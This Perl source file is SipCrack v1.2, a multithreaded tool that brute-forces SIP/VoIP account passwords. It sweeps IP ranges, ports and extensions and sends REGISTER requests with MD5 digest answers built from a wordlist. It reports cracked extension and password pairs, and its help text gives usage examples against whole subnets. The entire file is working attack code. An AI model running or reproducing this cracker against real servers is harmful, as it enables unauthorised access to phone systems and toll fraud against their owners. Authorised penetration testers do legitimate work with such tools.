#!/usr/bin/perl
# -=-=-=-=-=-=-
# SipCrack v1.2
# -=-=-=-=-=-=-
#
# Pepelux <pepeluxx@gmail.com>
 
use warnings;
use strict;
use IO::Socket;
use IO::Socket::Timeout;
use NetAddr::IP;
use threads;
use threads::shared;
use Getopt::Long;
use Digest::MD5 qw(md5 md5_hex md5_base64);
 
my $useragent = 'sipptk';
 
my $maxthreads = 300;
my $time_ping = 2; # wait secs
 
my $threads : shared = 0;
my $found : shared = 0;
my $count : shared = 0;
my @range;
my @results;
 
my $host = '';		# host
my $lport = '';		# local port
my $dport = '';		# destination port
my $from = '';		# source number
my $to = '';		# destination number
my $wordlist = '';	# wordlist
my $v = 0;		# verbose mode
my $vv = 0;		# more verbose
my $exten = '';		# extension
my $prefix = '';	# prefix
my $resume = 0;		# resume
my $abort = 0;

my $realm = '';
my $nonce = '';
	
my $to_ip = '';
my $from_ip = '';

my $i;
my $j;
my $k;
my $csec;
my $word = '';
my $wini = '';
my $nhost;
my $pini;
my $pfin;
my $eini;
my $efin;
my $hini = 0;

if (! -d "tmp") {
	mkdir ("tmp");
}

my $tmpfile = "tmp/sipcrack".time().".txt";
 
open(OUTPUT,">$tmpfile");
 
OUTPUT->autoflush(1);
STDOUT->autoflush(1);

$SIG{INT} = \&interrupt;
 
sub init() {
    # check params
    my $result = GetOptions ("h=s" => \$host,
				"d=s" => \$to,
				"s=s" => \$from,
				"ip=s" => \$from_ip,
				"e=s" => \$exten,
				"l=s" => \$lport,
				"r=s" => \$dport,
				"w=s" => \$wordlist,
				"resume+" => \$resume,
				"v+" => \$v,
				"vv+" => \$vv);

	help() if (($host eq "" || $wordlist eq "") && $resume eq 0);
 
 	my $row;
 
	if ($resume eq 1) {
		open(TMPFILE,"<sipcrack.res");

		$row = <TMPFILE>;
		chomp $row;
		$host = $row;
	}

	if ($host =~ /\-/) {
		my $ip = $host;

		$ip =~ /([0-9|\.]*)-([0-9|\.]*)/;
		my $ipini = $1;
		my $ipfin = $2;

		my $ip2 = $ipini;
		$ip2 =~ /(\d+)\.(\d+)\.(\d+)\.(\d+)/;
		my $ip2_1 = int($1);
		my $ip2_2 = int($2);
		my $ip2_3 = int($3);
		my $ip2_4 = int($4);

		my $ip3 = $ipfin;
		$ip3 =~ /(\d+)\.(\d+)\.(\d+)\.(\d+)/;
		my $ip3_1 = int($1);
		my $ip3_2 = int($2);
		my $ip3_3 = int($3);
		my $ip3_4 = int($4);

		for (my $i1 = $ip2_1; $i1 <= $ip3_1; $i1++) {
			for (my $i2 = $ip2_2; $i2 <= $ip3_2; $i2++) {
				for (my $i3 = $ip2_3; $i3 <= $ip3_3; $i3++) {
					for (my $i4 = $ip2_4; $i4 <= $ip3_4; $i4++) {
						$ip = "$i1.$i2.$i3.$i4";
						push @range, $ip;
					}
				}
			}
		}
	}
	else {
		my $ip = new NetAddr::IP($host);

		if ($ip < $ip->broadcast) {
			$ip++;

			while ($ip < $ip->broadcast) {
				my $ip2 = $ip;
				$ip2 =~ /(\d+)\.(\d+)\.(\d+)\.(\d+)/;
				$ip2 = "$1.$2.$3.$4";
				push @range, $ip2;
				$ip++;
			}
		}
		else {
			push @range, $host;
		}
	}

	if ($resume eq 1) {
		$row = <TMPFILE>;
		chomp $row;
		$lport = $row;
		$row = <TMPFILE>;
		chomp $row;
		$dport = $row;
		$row = <TMPFILE>;
		chomp $row;
		$exten = $row;
		$row = <TMPFILE>;
		chomp $row;
		$wordlist = $row;
		$row = <TMPFILE>;
		chomp $row;
		$hini = $row;
		$row = <TMPFILE>;
		chomp $row;
		$nhost = $row;
		$row = <TMPFILE>;
		chomp $row;
		$pini = $row;
		$row = <TMPFILE>;
		chomp $row;
		$pfin = $row;
		$row = <TMPFILE>;
		chomp $row;
		$eini = $row;
		$row = <TMPFILE>;
		chomp $row;
		$efin = $row;
		$row = <TMPFILE>;
		chomp $row;
		$wini = $row;
		$row = <TMPFILE>;
		chomp $row;
		$v = $row;
		$row = <TMPFILE>;
		chomp $row;
		$vv = $row;

		while (<TMPFILE>) {
			chomp;
			print OUTPUT $_."\n";
		}
		
		close(TMPFILE);

		print "Resuming session ...\n";
		print "Hosts          : $host\n";
		print "Local port     : $lport\n";
		print "Remote port    : $dport\n";
		print "Extensions     : $exten\n";
		print "Wordlist       : $wordlist\n";
		print "Last host      : ".$range[$hini]."\n";
		print "Scanning port  : $pini\n";
		print "Scanning exten : $eini\n";
		print "Scanning word  : $wini\n";
	}
	else {
		$lport = "5070" if ($lport eq "");
		$dport = "5060" if ($dport eq "");
		$exten = "100-1000" if ($exten eq "");

		if ($dport =~ /\-/) {
			$dport =~ /([0-9]*)-([0-9]*)/;
			$pini = $1;
			$pfin = $2;
		}
		else {
			$pini = $dport;
			$pfin = $dport;
		}

		if ($exten =~ /\-/) {
			$exten =~ /([0-9]*)-([0-9]*)/;
			$eini = $1;
			$efin = $2;
		}
		else {
			$eini = $exten;
			$efin = $exten;
		}

		$nhost = @range;
	}

	my $analize = 0;
 
 	open(WL,"<$wordlist");

	while(<WL>) {
		chomp;
		
		$word = $_;
		
		$analize = 1 if ($wini eq '' || $wini eq $word);
		
		if ($analize eq 1) {
			for ($i = $hini; $i <= $nhost; $i++) {
				for ($j = $pini; $j <= $pfin; $j++) {
					for ($k = $eini; $k <= $efin; $k++) {
						while (1) {
							if ($threads < $maxthreads) {
								$from = $prefix.$k if ($from eq "" || $eini ne $efin);
								$to = $prefix.$k if ($to eq "" || $eini ne $efin);
								last unless defined($range[$i]);
								$csec = 1;
								$from_ip = $range[$i] if ($from_ip eq "");
								my $thr = threads->new(\&scan, $range[$i], $from_ip, $lport, $j, $from, $to, $csec, $prefix.$k, $word);
								$thr->detach();

								last;
							}
							else {
								sleep(1);
							}
						}
					}
				}
			}
		}
	}

	sleep(1);

	close (WL);
	close(OUTPUT);

	open(OUTPUT, $tmpfile);
 
	print "\nIP address\tPort\tExten\tPass\n";
	print "==========\t====\t=====\t====\n";

	my @results = <OUTPUT>;
	close (OUTPUT);

	unlink($tmpfile);

	@results = sort(@results);

	foreach(@results) {
		print $_;
	}

	print "\n";

	exit;
}

sub interrupt {
	if ($abort eq 0) {
		$abort = 1;
		my $i2 = $i;
		my $j2 = $j;
		my $k2 = $k;
		{lock($threads); $threads=$maxthreads;}

		print "Closing threads. Please wait ...\n";
		sleep(2);

		close (WL);
		close(OUTPUT);

		open(OUTPUT, $tmpfile);

		print "\nIP address\tPort\tExten\tPass\n";
		print "==========\t====\t=====\t====\n";

		my @results = <OUTPUT>;
		close (OUTPUT);

		unlink($tmpfile);

		@results = sort(@results);

		foreach(@results) {
			print $_;
		}

		print "\n";
	
		$tmpfile = "sipcrack.res";
		unlink($tmpfile);
		open(OUTPUT,">$tmpfile");
		print OUTPUT "$host\n";
		print OUTPUT "$lport\n";
		print OUTPUT "$dport\n";
		print OUTPUT "$exten\n";
		print OUTPUT "$wordlist\n";
		print OUTPUT "$i2\n";
		print OUTPUT "$nhost\n";
		print OUTPUT "$j2\n";
		print OUTPUT "$pfin\n";
		print OUTPUT "$k2\n";
		print OUTPUT "$efin\n";
		print OUTPUT "$word\n";
		print OUTPUT "$v\n";
		print OUTPUT "$vv\n";
		foreach(@results) {
			print OUTPUT $_;
		}
		close (OUTPUT);

		print "Host           : $host\n";
		print "Local port     : $lport\n";
		print "Remote port    : $dport\n";
		print "Extensions     : $exten\n";
		print "Wordlist       : $wordlist\n";
		print "Starting host  : ".$range[$i2]."\n";
		print "Starting port  : $j2\n";
		print "Starting exten : $k2\n";
		print "Starting word  : $word\n";

		print "\nRun perl $0 -resume to resume session\n\n";
 
		exit;
	}
	else {
		print "Closing threads. Please wait ...\n\n";
	}
}

sub scan {
	my $to_ip = shift;
	my $from_ip = shift;
	my $lport = shift;
	my $dport = shift;
	my $from = shift;
	my $to = shift;
	my $csec = shift;
	my $user = shift;
	my $pass = shift;

	my $callid = &generate_random_string(32, 1);

	send_register($from_ip, $to_ip, $lport, $dport, $from, $to, $csec, $user, $pass, $callid, "");
	my $uri = "sip:$to_ip";
	my $a = md5_hex($user.':'.$realm.':'.$pass);
	my $b = md5_hex('REGISTER:'.$uri);
	my $r = md5_hex($a.':'.$nonce.':'.$b);
	my $digest = "username=\"$user\", realm=\"$realm\", nonce=\"$nonce\", uri=\"$uri\", response=\"$r\", algorithm=MD5";
	send_register($from_ip, $to_ip, $lport, $dport, $from, $to, $csec, $user, $pass, $callid, $digest);
}
 
# Send REGISTER message
sub send_register {
	{lock($count);$count++;}
	{lock($threads);$threads++;}
 
	my $from_ip = shift;
	my $to_ip = shift;
	my $lport = shift;
	my $dport = shift;
	my $from = shift;
	my $to = shift;
	my $cseq = shift;
	my $user = shift;
	my $pass = shift;
	my $callid = shift;
	my $digest = shift;

	my $sc = new IO::Socket::INET->new(PeerPort=>$dport, Proto=>'udp', PeerAddr=>$to_ip, Timeout => 10);
	IO::Socket::Timeout->enable_timeouts_on($sc);
	$sc->read_timeout(0.5);
	$sc->enable_timeout;
	$lport = $sc->sockport();

	my $branch = &generate_random_string(71, 0);
	
	my $msg = "REGISTER sip:".$to_ip." SIP/2.0\n";
	$msg .= "Via: SIP/2.0/UDP $from_ip:$lport;branch=$branch\n";
	$msg .= "From: <sip:".$user."@".$to_ip.">;tag=0c26cd11\n";
	$msg .= "To: <sip:".$user."@".$to_ip.">\n";
	$msg .= "Contact: <sip:".$user."@".$from_ip.":$lport;transport=udp>\n";
	$msg .= "Authorization: Digest $digest\n" if ($digest ne "");
	$msg .= "Call-ID: ".$callid."\n";
	$msg .= "CSeq: $cseq REGISTER\n";
	$msg .= "User-Agent: $useragent\n";
	$msg .= "Max-Forwards: 70\n";
	$msg .= "Allow: INVITE,ACK,CANCEL,BYE,NOTIFY,REFER,OPTIONS,INFO,SUBSCRIBE,UPDATE,PRACK,MESSAGE\n";
	$msg .= "Expires: 10\n";
	$msg .= "Content-Length: 0\n\n";

	my $data = "";
	my $response = "";
	my $server = "";
	my $ua = "";
	my $line = "";

	if ($sc) {
		print $sc $msg;

		print "[+] $to_ip - Sending REGISTER $from => $to (trying pass: $pass)\n" if ($v eq 1);
		print "[+] $to_ip - Sending:\n=======\n$msg" if ($vv eq 1);

		use Errno qw(ETIMEDOUT EWOULDBLOCK);
		
		LOOP: {
			while (<$sc>) {
				if ( 0+$! == ETIMEDOUT || 0+$! == EWOULDBLOCK ) {
					{lock($threads);$threads--;}
					return "";
				}

				$line = $_;
			
				if ($line =~ /^SIP\/2.0/ && $response eq "") {
					$line =~ /^SIP\/2.0\s(.+)\r\n/;
				
					if ($1) { $response = $1; }
				}

				if ($line =~ /^WWW-Authenticate:/ || $line =~ /^Proxy-Authenticate:/) {
					$line =~ /^WWW-Authenticate:\sDigest\salgorithm=(.+),\srealm=\"(.+)\",\snonce=\"(.+)\"\r\n/ if ($line =~ /^WWW-Authenticate:/);
					$line =~ /^Proxy-Authenticate:\sDigest\salgorithm=(.+),\srealm=\"(.+)\",\snonce=\"(.+)\"\r\n/ if ($line =~ /^Proxy-Authenticate:/);
					$realm = $2 if ($2);
					$nonce = $3 if ($3);
				}
 
				$data .= $line;
 
				if ($line =~ /^\r\n/) {
					print "[-] $response\n" if ($v eq 1);
					print "Receiving:\n=========\n$data" if ($vv eq 1);

					last LOOP if ($response !~ /^1/);
				}
			}
		}
    
		if ($response =~ "^200") {
			print OUTPUT "$to_ip\t$dport\t$user\t$pass\n";
			print "Found match: $to_ip:$dport - User: $user - Pass: $pass\n";
			{lock($found);$found++;}
		}
	}
	
	{lock($threads);$threads--;}
	
	return $response;
}

 
sub generate_random_string {
    my $length_of_randomstring = shift;
    my $only_hex = shift;
    my @chars;
 
    if ($only_hex == 0) {
        @chars = ('a'..'z','0'..'9');
    }
    else {
        @chars = ('a'..'f','0'..'9');
    }
    my $random_string;
    foreach (1..$length_of_randomstring) {
        $random_string.=$chars[rand @chars];
    }
    return $random_string;
}
 
sub help {
    print qq{
SipCRACK v1.2 - by Pepelux <pepeluxx\@gmail.com>
-------------

Usage: perl $0 -h <host> -w wordlist [options]
 
== Options ==
-e  <string>     = Extension (default from 100 to 1000)
-s  <integer>    = Source number (CallerID) (default: 100)
-d  <integer>    = Destination number (default: 100)
-r  <integer>    = Remote port (default: 5060)
-p  <string>     = prefix (for extensions)
-ip <string>     = Source IP (by default it is the same as host)
-resume          = Resume last session
-w               = Wordlist
-v               = Verbose (trace information)
-vv              = More verbose (more detailed trace)
 
== Examples ==
\$perl $0 -h 192.168.0.1 -w wordlist
\tTry to crack extensions from 100 to 1000 on 192.168.0.1 port 5060
\$perl $0 -h 192.168.0.0/24 -e 100-200 -p user -w wordlist -v
\tTry to crack extensions from user100 to user200 on 192.168.0.1 port 5060

};
 
    exit 1;
}
 
init();
